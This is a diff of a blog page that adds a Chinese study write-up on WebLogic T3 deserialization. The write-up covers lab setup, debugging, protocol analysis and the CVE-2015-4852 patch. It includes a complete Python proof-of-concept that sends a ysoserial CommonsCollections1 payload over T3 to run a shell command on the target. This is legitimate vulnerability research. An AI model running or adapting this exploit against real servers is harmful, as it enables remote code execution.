@@ -209,7 +209,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      266 字
+      2.5k 字
     </span>
   
 
@@ -219,7 +219,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      31
        分钟
     </span>
   
@@ -261,7 +261,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年7月4日 下午
+                  本文最后更新于：2021年7月6日 上午
                 
               </p>
             
@@ -276,8 +276,109 @@
 <p><code>Weblogic</code>安装包下载地址：<a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html">https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html</a></p>
 <p>我这里下载的是<code>weblogic 10.3.6</code>以及<code>jdk7u21</code></p>
 <p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/2.png" srcset="/img/loading.gif"></p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .<br><br>docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21<br></code></pre></td></tr></table></figure>
+<h2 id="1-Docker镜像构建"><a href="#1-Docker镜像构建" class="headerlink" title="1.Docker镜像构建"></a>1.Docker镜像构建</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .<br><br>docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21<br></code></pre></td></tr></table></figure>
 <p>这样我们的<code>weblogic</code>就运行起来了</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/3.png" srcset="/img/loading.gif"></p>
+<p>登录默认帐号密码为：<code>weblogic/qaxateam01</code></p>
+<h2 id="2-远程调试"><a href="#2-远程调试" class="headerlink" title="2.远程调试"></a>2.远程调试</h2><p>​    分析漏洞原因，我们需要进行一些代码的调试，所以需要配置远程调试。</p>
+<p>​    环境起来后，我们需要将<code>Weblogic</code> 的一些依赖从 docker 中拉出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir ./middleware<br>mkdir ./middleware/coherence_3.7<br>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./middleware/<br><br>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver ./middleware/<br><br>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./middleware/coherence_3.7/lib<br></code></pre></td></tr></table></figure>
+<p>然后用IDEA打开<code>wlserver</code>文件夹，再将我们之前导出的依赖进行导入。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/4.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/5.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/6.png" srcset="/img/loading.gif"></p>
+<p>设置<code>configuration</code></p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/8.png" srcset="/img/loading.gif"></p>
+<p>以上配置设置完成之后，就可以点击下图右上角的虫子<code>debug</code></p>
+<p>如果出现红框中的信息，则证明成功。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/7.png" srcset="/img/loading.gif"></p>
+<h2 id="3-远程断点调试测试"><a href="#3-远程断点调试测试" class="headerlink" title="3.远程断点调试测试"></a>3.远程断点调试测试</h2><p>在<code>WLSServletAdapter#handle</code>方法下下个断点，同时访问</p>
+<p><code>http://localhost:7001/wls-wsat/CoordinatorPortType</code>页面。</p>
+<p>如果成功截到数据，则证明可以进行远程断点调试。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/9.png" srcset="/img/loading.gif"></p>
+<h1 id="3-T3协议"><a href="#3-T3协议" class="headerlink" title="3.T3协议"></a>3.T3协议</h1><p><code>T3</code> 协议是 <code>Weblogic RMI</code> 调用时的通信协议。<code>RMI</code> 即远程方法调用，我们可以远程调用另一台 <code>JVM</code>虚拟机中对象上的方法，且数据传输过程中是序列化进行传输的。</p>
+<p>估计有小伙伴会疑惑了RMI的通信协议不是JRMP吗？</p>
+<blockquote>
+<p>​    Java RMI的默认基础通信协议为JRMP，但其也支持开发其他的协议用来优化RMI的传输，或者兼容非JVM，如WebLogic的T3和兼容CORBA的IIOP，其中T3协议为本文重点。</p>
+</blockquote>
+<p>奇安信 A-team 的师傅写过一篇很不错的关于 <code>Weblogic </code>的文章，感兴趣的可以去看看</p>
+<p>文章链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704</a></p>
+<p>T3传输协议是WebLogic的自有协议，它有如下特点：</p>
+<ol>
+<li>服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。</li>
+<li>通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。</li>
+</ol>
+<h1 id="4-漏洞原理（摘抄）"><a href="#4-漏洞原理（摘抄）" class="headerlink" title="4.漏洞原理（摘抄）"></a>4.漏洞原理（摘抄）</h1><p>该节点的文章是摘抄A-Team的文章，我有点懒[捂脸]，主要是A-Team的文章写的很好。</p>
+<p>我们来仔细看一下刚才抓到的正常WebLogic RMI调用时T3协议握手后的第一个数据包,有几点值得注意的是：</p>
+<ul>
+<li>我们发现每个数据包里不止包含一个序列化魔术头（0xac 0xed 0x00 0x05）</li>
+<li>每个序列化数据包前面都有相同的二进制串（0xfe 0x01 0x00 0x00）</li>
+<li>每个数据包上面都包含了一个T3协议头</li>
+<li>仔细看协议头部分，我们又发现数据包的前4个字节正好对应着数据包长度</li>
+<li>以及我们也能发现包长度后面的“01”代表请求，“02”代表返回</li>
+</ul>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/10.png" srcset="/img/loading.gif"></p>
+<p>这些点说明了T3协议由协议头包裹，且数据包中包含多个序列化的对象。那么我们就可以尝试构造恶意对象并封装到数据包中重新发送了。流程如下：</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/11.png" srcset="/img/loading.gif"></p>
+<p>替换序列化对象示意图如下：</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/12.png" srcset="/img/loading.gif"></p>
+<h1 id="5-实例解析"><a href="#5-实例解析" class="headerlink" title="5.实例解析"></a>5.实例解析</h1><p>​    只看文章，而不动手去分析是学不到知识的，因为我是用搭建环境的脚本搭建的<code>Weblogic</code>的，因此我打算直接打一个漏洞POC，然后用<code>wireshark</code>来抓包分析。</p>
+<h2 id="1-漏洞复现-CVE-2015-4852"><a href="#1-漏洞复现-CVE-2015-4852" class="headerlink" title="1.漏洞复现(CVE-2015-4852)"></a>1.漏洞复现(CVE-2015-4852)</h2><p>我采用该漏洞：<code>CVE-2015-4852 </code></p>
+<p>同时我这里的JDK版本是 7u21，这个JDK版本是可以利用<code>CommonsCollections1</code>作为利用链。同时环境也存在相对应的漏洞版本<code>CommonsCollections 3.2</code></p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20.png" srcset="/img/loading.gif"></p>
+<p>利用<code>ysoserial</code>生成PAYLOAD</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># @Time : 2021/7/5 下午10:05</span><br><span class="hljs-comment"># @Author : reader-l</span><br><span class="hljs-comment"># @File : weblogicTest.py</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">import</span> struct <span class="hljs-comment"># 负责大小端的转换</span><br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> stdout<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generatePayload</span>(<span class="hljs-params">gadget,cmd</span>):</span><br>    YSO_PATH = <span class="hljs-string">&quot;evil/ysoserial.jar&quot;</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)<br>    <span class="hljs-keyword">return</span> popen.stdout.read()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">T3Exploit</span>(<span class="hljs-params">ip,port,payload</span>):</span><br>    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    sock.connect((ip,port))<br>    handshake = <span class="hljs-string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span><br>    sock.sendall(handshake.encode())<br>    data = sock.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">compile</span> = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;HELO:(.*).0.false&quot;</span>)<br>    match = <span class="hljs-built_in">compile</span>.findall(data.decode())<br>    <span class="hljs-keyword">if</span> match:<br>        print(<span class="hljs-string">&quot;Weblogic: &quot;</span>+<span class="hljs-string">&quot;&quot;</span>.join(match))<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;Not Weblogic&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    header = binascii.a2b_hex(<span class="hljs-string">b&quot;00000000&quot;</span>)<br>    t3header = binascii.a2b_hex(<span class="hljs-string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)<br>    desflag = binascii.a2b_hex(<span class="hljs-string">b&quot;fe010000&quot;</span>)<br>    payload = header + t3header  +desflag+  payload<br>    payload = struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>,<span class="hljs-built_in">len</span>(payload)) + payload[<span class="hljs-number">4</span>:]<br>    sock.send(payload)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    ip = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    port = <span class="hljs-number">7001</span><br>    gadget = <span class="hljs-string">&quot;CommonsCollections1&quot;</span><br>    cmd = <span class="hljs-string">&quot;touch /tmp/success&quot;</span><br>    payload = generatePayload(gadget,cmd)<br>    T3Exploit(ip,port,payload)<br></code></pre></td></tr></table></figure>
+<p>执行过后会返回<code>Weblogic</code>的版本号，同时会在目标的<code>/tmp</code>目录下生成<code>success</code>文件。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/13.png" srcset="/img/loading.gif"></p>
+<h2 id="2-流量包分析"><a href="#2-流量包分析" class="headerlink" title="2.流量包分析"></a>2.流量包分析</h2><p>执行完测试脚本后，我们用<code>wireshark</code>抓取一下流量包来看一下。</p>
+<p><code> tcp.port == 7001</code> 即可看到我们的数据包，同时我们追踪流。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/14.png" srcset="/img/loading.gif"></p>
+<p>可以发现首先会发送一下<code>t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n</code>试探包，然后<code>Weblogic</code>会响应<code>HELO</code>和自身的版本回去，接下来就是PAYLOAD的数据包了。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/15.png" srcset="/img/loading.gif"></p>
+<p>通过学习，我们知道数据包的主要组成如下：</p>
+<p><code>【数据包长度】【T3协议头】【序列化魔术头】【数据】</code></p>
+<p>学习过JAVA序列化和反序列化的知识的小伙伴，都会知道<code>ac ed 00 05</code>这个是JAVA序列化的标志。而在<code>T3</code>协议中由于每个序列化数据包前面都有 <code>fe 01 00 00</code>，因此这里的序列化的标志相当于<code>fe 01 00 00 ac ed 00 05</code>。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/16.png" srcset="/img/loading.gif"></p>
+<h2 id="3-POC分析"><a href="#3-POC分析" class="headerlink" title="3.POC分析"></a>3.POC分析</h2><p>了解了<code>Weblogic</code>T3协议序列化中的数据包的组成结构以及返回数据结构就可以很好的理解这个POC了：</p>
+<p>在 Poc 中首先会发送握手包，如果检测到了类似如下的返回就输出</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">HELO:</span><span class="hljs-number">10.3</span>.<span class="hljs-number">6.0</span>.<span class="hljs-literal">false</span><br><span class="hljs-symbol">AS:</span><span class="hljs-number">2048</span><br><span class="hljs-symbol">HL:</span><span class="hljs-number">19</span><br></code></pre></td></tr></table></figure>
+<p>反之就直接返回不执行后续代码</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/17.png" srcset="/img/loading.gif"></p>
+<p>后续代码就是为了构成如下结构的数据包</p>
+<p><code>【数据包长度】【T3协议头】【序列化魔术头】【数据】</code></p>
+<p>首先利用 <code>00000000</code> 对开头的长度先进行占位，然后再后面拼接不会改变的<code>T3</code>协议头和 <code>T3</code>协议序列化标志，然后再将 <code>ysoerial.jar </code>生成的 payload 拼接在最后面，然后计算长度并将其转化成小端数，对前面的占位进行替换。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/18.png" srcset="/img/loading.gif"></p>
+<p>小技巧：可以通过将数据格式转换为<code>原始数据</code>格式，然后查找一下序列化的标志<code>fe010000aced0005</code>，即可将数据包长度到序列化标志之间的<code>T3协议头</code>给定位出来，然后复制出来。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/19.png" srcset="/img/loading.gif"></p>
+<h2 id="4-CVE-2015-4852漏洞分析学习"><a href="#4-CVE-2015-4852漏洞分析学习" class="headerlink" title="4.CVE-2015-4852漏洞分析学习"></a>4.CVE-2015-4852漏洞分析学习</h2><p>​    根据网上公开的信息，这个CVE漏洞的触发点是在<code>InboundMsgAbbrev#readObject</code> 方法处。</p>
+<p>可以发现变量<code>var1</code>是存储我们发送的请求的内容数据。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/22.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>read</code>方法进行查看，可以发现会调用父类的<code>read</code>方法也就是<code>ChunkedInputStream#read</code>方法。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/23.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>ChunkedInputStream#read</code>方法：前面的判断为<code>false</code>，因此直接返回了。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/24.png" srcset="/img/loading.gif"></p>
+<p>此处通过switch对<code>var2</code>值进行判断，此处为0，所以进入了第一个分支，在该方法处下个断点，可以发现调用了实例化子类<code>ServerChannelInputStream</code> 后 <code>readObject </code>方法，而且由于<code>ServerChannelInputStream</code>是继承<code>ObjectInputStream</code>类的，并且没有重写<code>readObject</code>方法，所以事实上是调用<code>ObjectInputStream</code>的<code>readObject</code>方法。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/25.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>ServerChannelInputStream</code>可以看到会调用<code>var1</code>代表的对象的<code>getServerChannel</code>获取一些连接信息。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/26.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/27.png" srcset="/img/loading.gif"></p>
+<p>之后在<code>InboundMsgAbbrev</code>的子类<code>ServerChannelInputStream</code>重写了<code>resolveClass</code>方法，看这个重写后的<code>resolveClass</code>方法，我们可以发现没有任何的防御，我们在这个方法下个断点：</p>
+<p>学过序列化和反序列化知识的应该都会知道这个点<code>resolveClass</code>：</p>
+<blockquote>
+<p>Java程序中类<code>ObjectInputStream</code>的<code>readObject</code>方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的<code>ObjectStreamClass</code>描述符会被读取，并返回相应的class对象，<code>ObjectStreamClass</code>包含了类的名称及<code>serialVersionUID</code>。</p>
+<p>如果类描述符是动态代理类，则调用<code>resolveProxyClass</code>方法来获取本地类。如果不是动态代理类则调用<code>resolveClass</code>方法来获取本地类。如果无法解析该类，则抛出<code>ClassNotFoundException</code>异常。</p>
+</blockquote>
+<p>你可以发现变量<code>var2</code>是CC1链的反序列化触发入口，之后每一次调用<code>resolveClass</code>方法都是在获取<code>CC1</code>利用链中所需要的类。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/28.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/29.png" srcset="/img/loading.gif"></p>
+<h2 id="5-官方修复"><a href="#5-官方修复" class="headerlink" title="5.官方修复"></a>5.官方修复</h2><p>这个漏洞的补丁是采用黑名单的方法，我没有补丁（好像得用购买ORACLE相对应的产品才可以看）。我就从<a target="_blank" rel="noopener" href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">大佬文章</a>中截取下来用了。</p>
+<p>采用黑名单机制是很容易被绕过的，后面陆续出现的漏洞也证明了这一点。</p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/30.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/31.png" srcset="/img/loading.gif"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1573#i">http://wjlshare.com/archives/1573#i</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/potatsoSec/p/14378757.html">https://www.cnblogs.com/potatsoSec/p/14378757.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/</a></p>
 
             </div>
             <hr>
